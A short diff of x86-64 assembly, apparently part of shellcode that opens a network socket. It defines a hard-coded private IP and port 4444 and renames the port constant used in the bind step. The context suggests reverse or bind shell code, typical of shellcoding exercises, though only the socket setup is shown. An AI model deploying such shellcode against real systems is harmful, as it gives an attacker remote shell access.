@@ -3,8 +3,7 @@ global _start
 
 IP       equ 0x81b8a8c0
 DPORT    equ 0x5c11
-
-BPORT    equ 0x5c11
+SPORT    equ 0x5c11
 
 SYS_SOCKET  equ 0x29
 SYS_BIND    equ 0x31
@@ -34,7 +33,7 @@ _start:
     struct_sockaddr_bind:
         push rdx
         mov dword [rsp + 0x4], edx
-        mov  word [rsp + 0x2], BPORT
+        mov  word [rsp + 0x2], SPORT
         mov  byte [rsp], AF_INET
 
     bind_socket:
